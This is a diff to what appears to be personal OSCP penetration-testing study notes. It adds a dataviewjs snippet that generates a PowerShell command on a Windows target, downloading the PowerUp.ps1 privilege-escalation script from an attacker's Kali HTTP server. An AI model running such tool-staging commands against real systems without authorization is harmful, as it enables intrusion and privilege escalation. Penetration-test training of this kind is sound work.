@@ -7,6 +7,15 @@ cd ~/Desktop/Tools/Windows && python -m http.server 80
 ```
 
 On WINDOWS TARGET
+
+Powershell (Modify Outfile Destination)
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `powershell wget http://${KaliIP}/PowerUp.ps1 -OutFile C:\\\Users\\\mike\\\Desktop\\\PowerUp.ps1`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
